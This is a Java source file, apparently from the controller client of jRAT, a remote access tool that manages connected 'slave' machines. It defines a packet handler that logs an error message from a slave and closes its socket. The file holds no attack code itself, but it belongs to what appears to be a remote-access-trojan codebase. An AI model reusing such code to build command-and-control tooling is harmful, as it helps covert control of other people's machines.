package pro.jrat.client.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.client.Slave;
import pro.jrat.client.exceptions.CloseException;
import pro.jrat.client.ui.panels.PanelMainLog;

public class Packet60Error extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String reason = slave.readLine();

		PanelMainLog.instance.addEntry("Error", slave, reason);

		slave.closeSocket(new CloseException("Error packet: " + reason));
	}

}
